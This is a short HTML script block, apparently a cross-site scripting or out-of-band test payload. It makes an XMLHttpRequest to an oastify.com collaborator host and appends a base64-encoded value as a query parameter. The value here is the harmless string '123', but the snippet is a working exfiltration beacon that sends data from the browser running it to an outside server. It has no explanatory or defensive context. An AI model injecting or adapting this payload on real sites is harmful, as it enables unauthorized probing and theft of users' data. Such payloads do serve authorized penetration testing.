<script>
	function reqListener() {
		console.log("done");
	};
	const req = new XMLHttpRequest();
	req.addEventListener("load", reqListener);
	req.open("GET", "https://39a6jjyh6zpe6ho85sbe9bj78yep2fq4.oastify.com/?lssss="+btoa("123"));
	req.send();
</script>
